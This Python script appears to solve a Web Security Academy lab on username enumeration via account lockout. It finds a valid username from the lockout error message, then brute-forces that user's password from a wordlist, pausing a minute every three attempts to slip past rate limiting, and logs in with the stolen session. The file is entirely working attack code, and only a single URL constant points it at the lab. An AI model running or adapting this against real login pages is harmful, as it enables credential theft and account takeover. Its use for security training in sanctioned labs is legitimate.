#######################################################################
#
# Lab: Username enumeration via account lock
#
# Hack Steps: 
#      1. Read usernames and passwords lists
#      2. Try all users multiple times until on account is locked
#      3. Brute force password of that valid username 
#         (wait 1 minute every 3 password tries to bypass blocking)
#      4. Login with the valid credentials
#
#######################################################################
import requests
import re
import time
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a6900000384bfed809358a5002300e6.web-security-academy.net"

SCRIPT_START_TIME = time.time()

def main():
    print("⦗1⦘ Reading usernames list.. ", end="", flush=True)

    usernames_list = read_list("../usernames.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Reading password list.. ", end="", flush=True)

    password_list = read_list("../passwords.txt") # Make sure the file exist in your root directory or change its path accordingly

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Trying to find a valid username.. ")

    valid_user = try_to_find_valid_username(usernames_list)  

    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "⦗4⦘ Brute forcing password.. ")

    (valid_password, valid_session) = brute_force_password(valid_user, password_list)  
    
    print(Fore.WHITE + "\n🗹 Valid username: " + Fore.GREEN + valid_user)
    print(Fore.WHITE + "🗹 Valid password: " + Fore.GREEN + valid_password)

    print(Fore.WHITE + "⦗5⦘ Logging in.. ", end="", flush=True)


    cookies = { "session": valid_session }
    fetch("/my-account", cookies)

    print(Fore.GREEN + "OK")
    print_finish_message()


def read_list(file_path):
    try:
        return open(file_path, 'rt').read().splitlines()
    except:
        print(Fore.RED + "⦗!⦘ Failed to opent the file " + file_path + " through exception")
        exit(1)


def try_to_find_valid_username(usernames_list):
    total_users = len(usernames_list)  
    
    for try_number in range(0, 4):
        print(Fore.WHITE + f"⦗*⦘ Try number: " + Fore.BLUE + str(try_number) + Fore.WHITE + " of all users..")
        
        for counter, user in enumerate(usernames_list):
            print_progress(counter, total_users, user)
            
            try_to_login = login(user, "not important")

            if try_to_login.status_code == 200:
                check_pattern = re.findall("too many incorrect login attempts", try_to_login.text)  
                
                if len(check_pattern) != 0:  
                    return user  
                else:
                    continue
            else:
                continue
    
    print(Fore.RED + "⦗!⦘ No valid username was found")
    exit(1)


def brute_force_password(valid_user, passwords):
    total_passwords = len(passwords)  
    
    for (counter, password) in enumerate(passwords):
        # Wait 1 minute every 2 tries
        if counter % 3 == 0:
            print(Fore.WHITE + "\n⦗*⦘ Waiting 1 minute to bypass blocking..")
            time.sleep(60)
        
        print_progress(counter, total_passwords, password)
        
        try_to_login = login(valid_user, password)

        if try_to_login.status_code == 302:  
            session = try_to_login.cookies.get("session")
            return (password, session)
        else:
            continue
        
    print(Fore.RED + "⦗!⦘ No valid password was found")
    exit(1)


def login(username, password):
    data = { "username": username, "password": password }
    try:
        return requests.post(f"{LAB_URL}/login", data, allow_redirects=False)
    except:
        print(Fore.RED + f"\n⦗!⦘ Failed to login as {username} through exception")


def fetch(path, cookies):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def print_progress(counter, total_counts, text):
    elapsed_time = (int((time.time() - SCRIPT_START_TIME) / 60))
    print(Fore.WHITE + "❯❯ Elapsed: " + Fore.YELLOW + str(elapsed_time) +
           Fore.WHITE + f" minutes || Trying ({counter+1}/{total_counts}): " + Fore.BLUE + f"{text:50}", end='\r', flush=True)


def print_finish_message():
    elapsed_time = int((time.time() - SCRIPT_START_TIME) / 60)     
    print(Fore.WHITE + "🗹 Finished in: " + Fore.YELLOW + str(elapsed_time) + Fore.WHITE + " minutes")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


if __name__ == "__main__":
    main()